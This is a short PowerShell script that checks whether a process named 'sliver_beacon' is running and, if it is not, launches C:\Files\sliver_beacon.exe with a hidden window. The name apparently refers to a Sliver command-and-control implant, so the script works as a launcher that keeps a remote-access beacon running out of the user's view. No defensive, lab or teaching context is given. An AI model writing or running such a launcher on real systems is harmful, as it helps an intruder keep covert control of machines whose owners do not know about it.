$processName = "sliver_beacon"
$filePath = "C:\Files\sliver_beacon.exe"

# Check if the process is already running
if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
    Write-Output "Beacon is already running. Exiting."
}
else {
    Write-Output "Beacon not found. Starting now..."
    Start-Process -FilePath $filePath -WindowStyle Hidden
}
